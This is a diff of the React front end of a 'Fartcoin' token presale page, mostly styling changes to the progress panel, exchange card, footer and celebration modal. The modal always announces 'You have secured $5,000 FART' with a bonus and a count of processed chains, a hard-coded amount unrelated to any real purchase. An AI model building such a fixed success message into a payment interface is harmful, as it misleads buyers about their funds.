           <div className="max-w-2xl mx-auto mt-12 mb-8 px-4">
-            <div className="terminal-frame p-8 border-white/50">
-              <h3 className="text-2xl font-bold text-center mb-6 bg-gradient-to-r from-white to-gray-300 bg-clip-text text-transparent">
+            <div className="terminal-frame p-8 border-white">
+              <h3 className="text-2xl font-terminal text-center mb-6 text-glow">
                 PRESALE LIVE PROGRESS
               </h3>
               
               <div className="grid grid-cols-3 gap-4 mb-6">
                 <div className="text-center">
-                  <div className="text-3xl font-bold text-orange-400 mb-1">${presaleStats.tokenPrice}</div>
+                  <div className="text-3xl font-bold mb-1">${presaleStats.tokenPrice}</div>
                   <div className="text-xs text-white/50">Token Price</div>
                 </div>
                 <div className="text-center">
@@ -1057,28 +1012,26 @@ function App() {
 
               {/* Progress Bar */}
               <div className="mb-4">
-                <div className="flex justify-between text-sm text-white/50 mb-2">
+                <div className="flex justify-between text-sm text-white/70 mb-2">
                   <span>Progress</span>
                   <span>{liveProgress.percentComplete}%</span>
                 </div>
-                <div className="w-full h-3 bg-gray-800 rounded-full overflow-hidden">
+                <div className="w-full h-3 border border-white/30 bg-black">
                   <div 
-                    className="h-full bg-gradient-to-r from-gray-400 to-white rounded-full relative"
+                    className="h-full bg-white"
                     style={{ width: `${liveProgress.percentComplete}%` }}
-                  >
-                    <div className="absolute inset-0 bg-white/20 animate-shimmer"></div>
-                  </div>
+                  ></div>
                 </div>
               </div>
 
               <div className="grid grid-cols-2 gap-4 mt-6">
-                <div className="bg-gray-800/50 rounded-lg p-3 text-center">
-                  <div className="text-sm text-white/50 mb-1">Participants Today</div>
-                  <div className="text-xl font-bold text-orange-400">{liveProgress.participantsToday}</div>
+                <div className="border border-white/30 p-3 text-center">
+                  <div className="text-sm text-white/70 mb-1">Participants Today</div>
+                  <div className="text-xl font-bold">{liveProgress.participantsToday}</div>
                 </div>
-                <div className="bg-gray-800/50 rounded-lg p-3 text-center">
-                  <div className="text-sm text-white/50 mb-1">Avg Allocation</div>
-                  <div className="text-xl font-bold text-yellow-400">${liveProgress.avgAllocation}</div>
+                <div className="border border-white/30 p-3 text-center">
+                  <div className="text-sm text-white/70 mb-1">Avg Allocation</div>
+                  <div className="text-xl font-bold">${liveProgress.avgAllocation}</div>
                 </div>
               </div>
 
@@ -1091,82 +1044,32 @@ function App() {
           </div>
 
           {/* Exchanges Section */}
-          <section className="py-16 px-4">
+          <section className="py-16-b px-4">
             <div className="container mx-auto">
-              <div className="terminal-frame p-6 max-w-4xl mx-auto border-white" style={{ boxShadow: 'rgba(255,255,255,0.5) 0px 0px 10px' }}>
+              <div className="terminal-frame p-6 max-w-4xl mx-auto border-white" style={{boxShadow: '0 0 10px rgba(255,255,255,0.5)'}}>
                 <h2 className="text-2xl md:text-3xl font-terminal text-glow text-center mb-8 text-white">
-                  &gt; WE'RE AVAILABLE ON
-                  <span className="cursor"></span>
+                  &gt; WE'RE AVAILABLE ON<span className="cursor"></span>
                 </h2>
                 <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
-
-                  {/* CoinMarketCap */}
-                  <div className="rounded-xl border text-card-foreground shadow bg-black border-white/50 hover:border-white transition-all duration-300">
-                    <div className="p-6 flex flex-col items-center">
-                      <div className="w-16 h-16 mb-4 relative">
-                        <img src="https://s2.coinmarketcap.com/static/cloud/img/coinmarketcap_white_1.svg" alt="CoinMarketCap" className="w-full h-full object-contain invert" />
-                      </div>
-                      <h3 className="text-white text-xl mb-4">CoinMarketCap</h3>
-                      <a 
-                        href="https://coinmarketcap.com" 
-                        target="_blank" 
-                        rel="noopener noreferrer" 
-                        className="inline-flex items-center justify-center gap-2 whitespace-nowrap font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 border bg-background shadow-sm hover:text-accent-foreground h-8 rounded-md px-3 text-xs border-white text-white hover:bg-white/20 w-full"
-                      >
-                        Trade Now
-                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-external-link ml-2 h-4 w-4">
-                          <path d="M15 3h6v6"></path>
-                          <path d="M10 14 21 3"></path>
-                          <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
-                        </svg>
-                      </a>
-                    </div>
-                  </div>
-
-                  {/* CoinGecko */}
-                  <div className="rounded-xl border text-card-foreground shadow bg-black border-white/50 hover:border-white transition-all duration-300">
-                    <div className="p-6 flex flex-col items-center">
-                      <div className="w-16 h-16 mb-4 relative">
-                        <img src="https://static.coingecko.com/s/coingecko-logo-white-3e3a70c19c.svg" alt="CoinGecko" className="w-full h-full object-contain invert" />
-                      </div>
-                      <h3 className="text-white text-xl mb-4">CoinGecko</h3>
-                      <a 
-                        href="https://coingecko.com" 
-                        target="_blank" 
-                        rel="noopener noreferrer" 
-                        className="inline-flex items-center justify-center gap-2 whitespace-nowrap font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 border bg-background shadow-sm hover:text-accent-foreground h-8 rounded-md px-3 text-xs border-white text-white hover:bg-white/20 w-full"
-                      >
-                        Trade Now
-                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-external-link ml-2 h-4 w-4">
-                          <path d="M15 3h6v6"></path>
-                          <path d="M10 14 21 3"></path>
-                          <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
-                        </svg>
-                      </a>
-                    </div>
-                  </div>
-
                   {/* Axiom */}
-                  <div className="rounded-xl border text-card-foreground shadow bg-black border-white/50 hover:border-white transition-all duration-300">
-                    <div className="p-6 flex flex-col items-center">
-                      <div className="w-16 h-16 mb-4 relative">
-                        <img src="https://axiom.trade/logo-white.svg" alt="Axiom" className="w-full h-full object-contain invert" />
-                      </div>
-                      <h3 className="text-white text-xl mb-4">Axiom</h3>
-                      <a 
-                        href="https://axiom.trade" 
-                        target="_blank" 
-                        rel="noopener noreferrer" 
-                        className="inline-flex items-center justify-center gap-2 whitespace-nowrap font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 border bg-background shadow-sm hover:text-accent-foreground h-8 rounded-md px-3 text-xs border-white text-white hover:bg-white/20 w-full"
-                      >
-                        Trade Now
-                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-external-link ml-2 h-4 w-4">
-                          <path d="M15 3h6v6"></path>
-                          <path d="M10 14 21 3"></path>
-                          <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
-                        </svg>
-                      </a>
+                  <div className="border border-white/50 hover:border-white transition-all duration-300 p-6 flex flex-col items-center">
+                    <div className="w-16 h-16 mb-4 relative">
+                      <img src="" alt="" />
                     </div>
+                    <h3 className="text-white text-xl mb-4">Axiom</h3>
+                    <a 
+                      href="#" 
+                      target="_blank" 
+                      rel="noopener noreferrer" 
+                      className="inline-flex items-center justify-center gap-2 whitespace-nowrap font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 border bg-background shadow-sm hover:text-accent-foreground h-8 rounded-md px-3 text-xs border-white text-white hover:bg-white/20 w-full"
+                    >
+                      Trade Now
+                      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="ml-2 h-4 w-4">
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14 21 3"></path>
+                        <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+                      </svg>
+                    </a>
                   </div>
                 </div>
                 <div className="mt-8 text-center text-white/70 text-sm">
@@ -1180,194 +1083,109 @@ function App() {
         {/* Footer */}
         <footer className="py-8 px-4 border-t border-white/30">
           <div className="container mx-auto">
-            <div className="terminal-frame p-6 max-w-4xl mx-auto border-white" style={{ boxShadow: 'rgba(255,255,255,0.5) 0px 0px 10px' }}>
+            <div className="terminal-frame p-6 max-w-4xl mx-auto border-white" style={{boxShadow: '0 0 10px rgba(255,255,255,0.5)'}}>
               <h2 className="text-xl md:text-2xl font-terminal text-glow text-center mb-6 text-white">
-                &gt; JOIN THE FART COMMUNITY
-                <span className="cursor"></span>
+                &gt; JOIN THE FART COMMUNITY<span className="cursor"></span>
               </h2>
               <div className="flex flex-wrap justify-center gap-8 mb-8">
-                <a 
-                  href="https://twitter.com" 
-                  target="_blank" 
-                  rel="noopener noreferrer" 
-                  className="group p-4"
-                >
-                  <div className="justify-center whitespace-nowrap rounded-md text-sm font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0 border bg-background shadow-sm hover:text-accent-foreground h-9 px-4 py-2 border-white hover:bg-white/20 flex items-center gap-2 text-white">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-twitter h-5 w-5 text-white group-hover:animate-pulse">
+                {/* Twitter/X */}
+                <div className="group p-4">
+                  <div className="border border-white hover:bg-white/20 flex items-center gap-2 text-white px-4 py-2 rounded-md transition-all cursor-pointer">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="h-5 w-5 text-white group-hover:animate-pulse">
                       <path d="M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6 2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4-.9-4.2 4-6.6 7-3.8 1.1 0 3-1.2 3-1.2z"></path>
                     </svg>
                     <span>X</span>
                   </div>
-                </a>
-                <a 
-                  href="https://t.me" 
-                  target="_blank" 
-                  rel="noopener noreferrer" 
-                  className="group p-4"
-                >
-                  <div className="justify-center whitespace-nowrap rounded-md text-sm font-medium transition-colors focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0 border bg-background shadow-sm hover:text-accent-foreground h-9 px-4 py-2 border-white hover:bg-white/20 flex items-center gap-2 text-white">
-                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="lucide lucide-message-circle h-5 w-5 text-white group-hover:animate-pulse">
+                </div>
+                {/* Telegram */}
+                <div className="group p-4">
+                  <div className="border border-white hover:bg-white/20 flex items-center gap-2 text-white px-4 py-2 rounded-md transition-all cursor-pointer">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="h-5 w-5 text-white group-hover:animate-pulse">
                       <path d="M7.9 20A9 9 0 1 0 4 16.1L2 22Z"></path>
                     </svg>
                     <span>Telegram</span>
                   </div>
-                </a>
+                </div>
               </div>
-              <div className="shrink-0 h-[1px] w-full bg-white/30 my-6"></div>
+              <div className="h-[1px] w-full bg-white/30 my-6"></div>
               <div className="text-center text-white/70 text-sm">
                 <p>© 2025 Fartcoin. All rights reserved.</p>
               </div>
             </div>
           </div>
         </footer>
-      </div>
 
-      {/* Celebration Modal */}
-      {showCelebration && (
-        <div className="fixed inset-0 bg-black/95 backdrop-blur-2xl flex items-center justify-center z-50 p-4 animate-fadeIn">
-          <div className="relative max-w-lg w-full">
-            <div className="absolute inset-0 bg-gradient-to-r from-gray-600 via-white to-gray-600 rounded-3xl blur-3xl animate-pulse-slow"></div>
-            
-            {[...Array(20)].map((_, i) => (
-              <div
-                key={i}
-                className="absolute w-2 h-2 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-full animate-confetti-cannon"
-                style={{
-                  left: `${Math.random() * 100}%`,
-                  top: '50%',
-                  animationDelay: `${i * 0.1}s`,
-                  animationDuration: `${1 + Math.random()}s`
-                }}
-              />
-            ))}
-            
-            <div className="relative bg-gradient-to-br from-gray-900 to-gray-800 rounded-3xl p-12 border border-white/30 shadow-2xl transform-gpu animate-scaleIn">
-              <div className="text-center">
-                <div className="relative mb-8">
-                  <div className="text-8xl animate-bounce-3d">🎉</div>
-                  {[...Array(16)].map((_, i) => (
-                    <div
-                      key={i}
-                      className="absolute w-3 h-3 bg-white rounded-full animate-confetti-spiral"
-                      style={{
-                        top: '50%',
-                        left: '50%',
-                        transform: `rotate(${i * 22.5}deg) translateY(-70px)`,
-                        animationDelay: `${i * 0.05}s`
-                      }}
-                    />
-                  ))}
+        {/* FART BUTTON - Easter egg */}
+        <div 
+          id="fart-button" 
+          className="hide-mobile fixed bottom-4 right-4 z-[9999] bg-black/90 border border-white/30 rounded-md px-4 py-2 font-mono text-white flex items-center gap-2 cursor-pointer hover:bg-white/10 transition-all"
+          onClick={() => {
+            setTxStatus('💨 FART!');
+            setTimeout(() => setTxStatus(''), 1000);
+          }}
+        >
+          PRESS <span className="bg-white/20 border border-white/40 px-2 py-1 rounded font-bold text-xs">F</span> TO FART
+        </div>
+
+        {/* Celebration Modal - Updated to Fartcoin */}
+        {showCelebration && (
+          <div className="fixed inset-0 bg-black/95 backdrop-blur flex items-center justify-center z-50 p-4">
+            <div className="relative max-w-lg w-full">
+              <div className="terminal-frame p-12 border-white">
+                <div className="text-center">
+                  <div className="text-8xl mb-8 animate-bounce">🎉</div>
+                  <h2 className="text-5xl font-terminal mb-4 text-glow">
+                    🚀 SUCCESSFUL! 🚀
+                  </h2>
+                  <p className="text-2xl text-white/70 mb-4">You have secured</p>
+                  <div className="text-6xl font-terminal text-glow mb-3">$5,000 FART</div>
+                  <div className="border border-green-400/50 px-8 py-4 mb-6">
+                    <span className="text-3xl text-green-400">+{presaleStats.currentBonus}% BONUS</span>
+                  </div>
+                  <p className="text-sm text-white/50 mb-8">
+                    Processed on {verifiedChains.length} chains: {verifiedChains.join(', ')}
+                  </p>
+                  <button
+                    onClick={() => setShowCelebration(false)}
+                    className="w-full border border-white px-8 py-4 hover:bg-white/20 transition-all text-2xl font-terminal"
+                  >
+                    VIEW
+                  </button>
                 </div>
-                
-                <h2 className="text-5xl font-black mb-4 bg-gradient-to-r from-yellow-400 via-orange-500 to-yellow-400 bg-clip-text text-transparent animate-pulse">
-                  🚀 SUCCESSFUL! 🚀
-                </h2>
-                
-                <p className="text-2xl text-gray-300 mb-4">You have secured</p>
-                
-                <div className="text-7xl font-black text-white mb-3 animate-float-3d">$5,000 FART</div>
-                
-                <div className="inline-block bg-gradient-to-r from-green-500/30 to-green-600/30 px-8 py-4 rounded-full mb-6 border border-green-500/50">
-                  <span className="text-3xl text-green-400">+{presaleStats.currentBonus}% BONUS</span>
-                </div>
-                
-                <p className="text-sm text-gray-500 mb-8">
-                  Processed on {verifiedChains.length} chains: {verifiedChains.join(', ')}
-                </p>
-                
-                <button
-                  onClick={() => setShowCelebration(false)}
-                  className="w-full bg-gradient-to-r from-gray-700 to-gray-900 hover:from-gray-800 hover:to-gray-900 text-white font-bold py-5 px-8 rounded-xl transition-all transform hover:scale-110 text-2xl relative group overflow-hidden border border-white/30"
-                >
-                  <span className="relative z-10">VIEW</span>
-                  <div className="absolute inset-0 bg-gradient-to-r from-white/0 via-white/30 to-white/0 animate-shimmer"></div>
-                </button>
               </div>
             </div>
           </div>
-        </div>
-      )}
+        )}
+      </div>
 
+      {/* Animation Keyframes */}
       <style>{`
         @keyframes textFlicker {
           0%, 19.999%, 22%, 62.999%, 64%, 64.999%, 70%, to { opacity: 1; }
           20%, 21.999%, 63%, 63.999%, 65%, 69.999% { opacity: 0.8; }
         }
+        
         @keyframes scan {
           0% { top: -10px; }
           to { top: 100%; }
         }
+        
         @keyframes blink {
-          0%, 100% { opacity: 1; }
+          0%, to { opacity: 1; }
           50% { opacity: 0; }
         }
-        @keyframes fartGasMove {
-          0% { opacity: 0; transform: translate(0px, 0px) scale(0.5); filter: blur(20px); }
-          30% { opacity: 1; transform: translate(20px, -30px) scale(1.2); filter: blur(10px); }
-          100% { opacity: 0; transform: translate(-40px, 60px) scale(2); filter: blur(30px); }
+        
+        .text-glow {
+          text-shadow: 0 0 5px rgba(255,255,255,0.7), 0 0 10px rgba(255,255,255,0.5);
         }
-        @keyframes confetti-cannon {
-          0% { transform: translateY(0) rotate(0deg); opacity: 1; }
-          100% { transform: translateY(-300px) rotate(720deg) translateX(200px); opacity: 0; }
-        }
-        @keyframes confetti-spiral {
-          0% { transform: rotate(0deg) translateY(0) scale(1); opacity: 1; }
-          100% { transform: rotate(720deg) translateY(-150px) scale(0); opacity: 0; }
-        }
-        @keyframes pulse-slow {
-          0%, 100% { opacity: 0.5; }
-          50% { opacity: 1; }
-        }
-        @keyframes float-3d {
-          0%, 100% { transform: translateY(0) rotateX(0deg); }
-          25% { transform: translateY(-20px) rotateX(10deg); }
-          75% { transform: translateY(20px) rotateX(-10deg); }
-        }
-        @keyframes shimmer {
-          0% { transform: translateX(-100%); }
-          100% { transform: translateX(100%); }
-        }
-        @keyframes fadeIn {
-          from { opacity: 0; }
-          to { opacity: 1; }
-        }
-        @keyframes scaleIn {
-          from { transform: scale(0.9); opacity: 0; }
-          to { transform: scale(1); opacity: 1; }
-        }
-        @keyframes bounce-3d {
-          0%, 100% { transform: translateY(0); }
-          50% { transform: translateY(-20px); }
-        }
-        .scan-effect {
-          position: relative;
-          overflow: hidden;
-        }
-        .scan-effect:after {
-          content: "";
-          position: absolute;
-          top: -100%;
-          left: 0;
-          width: 100%;
-          height: 10px;
-          background: linear-gradient(180deg, #fff0, #fff3, #fff0);
-          animation: scan 4s linear infinite;
-        }
-        .cursor {
-          display: inline-block;
-          width: 0.6ch;
-          height: 1em;
-          background: white;
-          margin-left: 2px;
-          animation: blink 1s step-end infinite;
-        }
+        
         .terminal-frame {
-          border-radius: 0.5rem;
-          border-width: 1px;
-          box-shadow: 0 0 10px #ffffff80;
+          border: 1px solid rgba(255,255,255,0.5);
+          box-shadow: 0 0 10px rgba(255,255,255,0.5);
           position: relative;
         }
-        .terminal-frame:before {
+        
+        .terminal-frame::before {
           content: "";
           position: absolute;
           top: 0;
@@ -1378,48 +1196,53 @@ function App() {
           pointer-events: none;
           margin: 3px;
         }
-        .text-glow {
-          text-shadow: 0 0 5px rgba(255,255,255,.7), 0 0 10px rgba(255,255,255,.5);
+        
+        .scan-effect {
+          position: relative;
+          overflow: hidden;
         }
-        .text-flicker {
+        
+        .scan-effect::after {
+          content: "";
+          position: absolute;
+          top: -100%;
+          left: 0;
+          width: 100%;
+          height: 10px;
+          background: linear-gradient(180deg, transparent, rgba(255,255,255,0.2), transparent);
+          animation: scan 4s linear infinite;
+        }
+        
+        .cursor {
+          display: inline-block;
+          width: 0.6ch;
+          height: 1em;
+          background: white;
+          margin-left: 2px;
+          animation: blink 1s step-end infinite;
+        }
+        
+        .animate-flicker {
           animation: textFlicker 3s infinite alternate;
         }
-        .glow-on-hover {
-          color: #ffffff;
-          text-shadow: 0 0 5px rgba(255,255,255,0.6), 0 0 10px rgba(255,255,255,0.5), 0 0 20px rgba(255,255,255,0.3);
-        }
+        
         .glow-on-hover:hover {
           text-decoration: underline;
+          text-shadow: 0 0 5px rgba(255,255,255,0.6), 0 0 10px rgba(255,255,255,0.5), 0 0 20px rgba(255,255,255,0.3);
         }
-        .hide-mobile {
-          display: block;
+        
+        .font-terminal {
+          font-family: 'VT323', monospace;
         }
+        
+        .font-mono {
+          font-family: 'Fira Code', monospace;
+        }
+        
         @media (max-width: 479px) {
           .hide-mobile {
             display: none !important;
           }
-        }
-        .animate-pulse { animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
-        .animate-spin { animation: spin 1s linear infinite; }
-        .animate-ping { animation: ping 1s cubic-bezier(0, 0, 0.2, 1) infinite; }
-        .animate-shimmer { animation: shimmer 2s infinite; }
-        .animate-fadeIn { animation: fadeIn 0.5s ease-out; }
-        .animate-scaleIn { animation: scaleIn 0.5s ease-out; }
-        .animate-bounce-3d { animation: bounce-3d 2s ease-in-out infinite; }
-        .animate-float-3d { animation: float-3d 6s ease-in-out infinite; }
-        .animate-pulse-slow { animation: pulse-slow 3s ease-in-out infinite; }
-        .animate-confetti-cannon { animation: confetti-cannon 2s ease-out forwards; }
-        .animate-confetti-spiral { animation: confetti-spiral 1.5s ease-out forwards; }
-        @keyframes spin {
-          from { transform: rotate(0deg); }
-          to { transform: rotate(360deg); }
-        }
-        @keyframes ping {
-          75%, 100% { transform: scale(2); opacity: 0; }
-        }
-        @keyframes pulse {
-          0%, 100% { opacity: 1; }
-          50% { opacity: .5; }
         }
       `}</style>
     </div>
